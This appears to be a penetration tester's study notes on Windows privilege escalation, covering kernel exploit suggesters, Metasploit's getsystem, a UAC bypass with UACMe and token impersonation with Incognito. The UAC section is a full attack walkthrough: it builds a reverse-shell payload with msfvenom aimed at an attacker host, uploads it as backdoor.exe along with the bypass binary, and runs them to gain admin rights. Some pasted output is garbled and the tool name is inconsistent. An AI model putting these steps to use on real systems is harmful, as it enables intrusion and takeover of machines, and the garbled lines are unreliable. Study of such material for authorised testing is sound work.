--- 

- Privilege escalation is the process of exploiting vulnerabilities or misconfigurations in
systems to elevate privileges from one user to another, typically to a user with
administrative or root access on a system.

- Privilege escalation is a vital element of the attack life cycle and is a major determinant in the overall success of a penetration test.

- After gaining an initial foothold on a target system, you will be required to elevate your privileges in order to perform tasks and functionality that require administrative privileges.

- The importance of privilege escalation in the penetration testing process cannot be
overstated or overlooked. Developing your privilege escalation skills will mark you out
as a good penetration tester.

## Windows Kernel

A Kernel is a computer program that is the core of an operating system and has
complete control over every resource and hardware on a system. It acts as a translation layer between hardware and software and facilitates the communication between these two layers.

- Windows NT is the kernel that comes pre-packaged with all versions of Microsoft Windows and operates as a traditional kernel with a few exceptions based on user design philosophy. It consists of two main modes of operation that determine access to system resources and hardware:

	**○ User Mode** – Programs and services running in user mode have limited access to
	system resources and functionality.

	**○ Kernel Mode** – Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory.

## Windows Kernel Exploitation

-  Kernel exploits on Windows will typically target vulnerabilities In the
Windows kernel to execute arbitrary code in order to run privileged system
commands or to obtain a system shell.

 - This process will differ based on the version of Windows being targeted and
the kernel exploit being used.

 - Privilege escalation on Windows systems will typically follow the following
methodology:
+ Identifying kernel vulnerabilities
+ Downloading, compiling and transferring kernel exploits onto the target
system.

### Tools & Environment

 1. **Windows-Exploit-Suggester** - This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.
+ GitHub: https://github.com/AonCyberLabs/Windows-Exploit-Suggester

2. **Windows-Kernel-Exploits** - Collection of Windows Kernel exploits sorted by CVE.
+ GitHub: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

### Basic Windows Kernel Exploit
Frequently, especially with client side exploits, you will find that your session only has limited user rights. This can severely limit actions you can perform on the remote system such as dumping passwords, manipulating the registry, installing backdoors, etc. Fortunately, Metasploit has a Meterpreter script, **getsystem**, that will use a number of different techniques to attempt to gain SYSTEM level privileges on the remote system. There are also various other (local) exploits that can be used to also escalate privileges.

```bash
meterpreter > getsystem
```

### Exploit Windows Kernel Using Meatasploit

The Local Exploit Suggester is a post-exploitation module that you can use to check a system for local vulnerabilities. It performs local exploit checks; it does not actually run any exploits, which is useful because this means you to scan a system without being intrusive. In addition to being stealthy, it's a time saver. You don't have to manually search for local exploits that will work; it'll show you which exploits the target is vulnerable to based on the system's platform and architecture.

The Local Exploit Suggester is available for Python, PHP, and Windows Meterpreter.

```bash
post/multi/recon/local_exploit_suggester                   
# This module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter. It's important to note that not all local exploits will be fired. Exploits are chosen based on these conditions: session type, platform, architecture, and required default options.

msf >  post(local_exploit_suggester) 
msf > show options ... show and set options ... 
msf > post(local_exploit_suggester) > set SESSION session-id 
msf > post(local_exploit_suggester) > exploit
```

  
## Bypassing UAC 

### [UAC (User Account Control)](https://learn.microsoft.com/en-us/windows/win32/uxguide/winenv-uac)

-  User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to prevent unauthorized changes from being made to the operating system.

![[Pasted image 20230414071253.png]]

-  UAC is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the local administrators group.

 - A non-privileged user attempting to execute a program with elevated privileges will be prompted with the UAC credential prompt, whereas a privileged user will be prompted with a consent prompt.

 - Attacks can bypass UAC in order to execute malicious executables with elevated privileges.

### Bypassing UAC

- In order to successfully bypass UAC, we will need to have access to a user account that is a part of the local administrators group on the Windows target system.

- UAC allows a program to be executed with administrative privileges, consequently prompting the user for confirmation.

- UAC has various integrity levels ranging from low to high, if the UAC protection level is set below high, Windows programs can be executed with elevated privileges without prompting the user for confirmation.

 - There are multiple tools and techniques that can be used to bypass UAC, however, the tool and technique used will depend on the version of Windows running on the target system.
 - 
### [UACMe Tool](https://github.com/hfiref0x/UACME)

 - UACMe is an open source, robust privilege escalation tool developed by @hfire0x. It can be used to bypass Windows UAC by leveraging various techniques. 

-  The UACME GitHub repository contains a very well documented list of methods that can be used to bypass UAC on multiple versions of Windows ranging from Windows 7  to Windows 10.

-  It allows attackers to execute malicious payloads on a Windows target with administrative/elevated privileges by abusing the inbuilt Windows AutoElevate tool.

-  The UACMe GitHub repository has more than 60 exploits that can be used to bypassUAC depending on the version of Windows running on the target.

### How To Exploit ?
1. Understand the structure of the accounts in the target system, then you MUST have access to an administrator local user.
``` powershell
net user
# Adds or modifies user accounts, or displays user account information.

net localgroup administrators 
# displays the name of the server and the names of local groups on the computer.
```


``` bash
meterpreter > pgrep explorer
2448 

meterpreter > migrate 2448 
[-} Migrating from 820 to 2448... 
[~] Migration completed successfully. 

meterpreter > sysinfo 
Computer : VICTIM 
OS : Windows 2012 R2 (6.3 Build 9600). 
Architecture : x64 
System Language : en_US 
Domain : WORKGROUP 
Logged On Users : 2 
Meterpreter : x64/windows 

meterpreter > getuid 
Server username: VICTIM\admin 

meterpreter > getprivs
```


2. Create a meterpreter payload to get a shell in the target.
``` bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
```

3. Start a listener in for the payload
```bash
msf > use exploit/multi/handler 
msf exploit(handler) > show targets ... a list of targets ... 
msf exploit(handler) > set TARGET target-id 
msf exploit(handler) > show options ... show and set options ... 
msf exploit(handler) > exploit
```

4. Upload the payload and the `Akamaix64.exe` then run it, and smash you got an admin privileges
``` bash
meterpreter > cd C:\\ 
meterpreter > mkdir Temp 
Creating directory: Temp 
# use none used direcory in your payloads

meterpreter > cd Temp 
meterpreter > upload backdoor.exe 
[-] uploading : /root/backdoor.exe -> backdoor.exe 
[-] Uploaded 72.67 KiB of 72.07 KiB (100.6%): /root/backdoor.exe -> backdoor.exe 

meterpreter > upload backdoor.exe 
[~] uploadin-72:67-x1B of 72.07 KiB (100.0%): /root7vackdudl.exe -> backdoor.exe [-] Uploaded : /root/backdoor.exe -> backdoor.exe 

meterpreter > upload root/Desktop/tools/Akamaix64.exe 
[-] uploading : /root/Desktop/tools/UACME/Akamaix64.exe -> Akamaix64.exe 
[~] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akamaix64.exe -> Akamaix64.exe - uploaded : /root/Desktop/tools/UACME/Akamaix64.exe -> Akamaix64, exe 

meterpreter > shell 
Process 2124 created. Froces! % created.

cmd> C:\Temp>.\Akagi64.exe 23 C:\Temp\backdoor.exe
```

5. Play around with the new administrative shell.
``` bash
meterpreter > migrate 688
meterpreter > sysinfo
meterpreter > getuid
```

## Windows Access Tokens

 Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).
 
![[Pasted image 20230414095704.png]]

 - A Windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started, or a system resource is accessed.

- Access tokens are generated by the winlogon.exe process every time a user authenticates
successfully and includes the identity and privileges of the user account associated with the
thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token

- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.

 - An access token will typically be assigned one of the following security levels:
	1. Impersonate-level tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
	
	2. Delegate-level tokens are typically created through an interactive login on Windows, primarily through a traditional login or through remote access protocols such as RDP.

- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.

 - Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.
 - 
### Windows Privileges

 - The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.

- The following are the privileges that are required for a successful impersonation attack:

	1. SeAssignPrimaryToken: This allows a user to impersonate tokens.
	2.  SeCreateToken: This allows a user to create an arbitrary token with administrative privileges.
	3.  SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.

### The Incognito Module
 
- Incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation.

- We can use the incognito module to display a list of available tokens that we
can impersonate.

``` bash
meterpreter > use incognito
Loading extension incognito...success.

meterpreter > help
...
	meterpreter > list_tokens -u
...
meterpreter > impersonate_token SNEAKS.IN\\Administrator
...
	meterpreter > pgrep explorer
...
meterpreter > shell
```




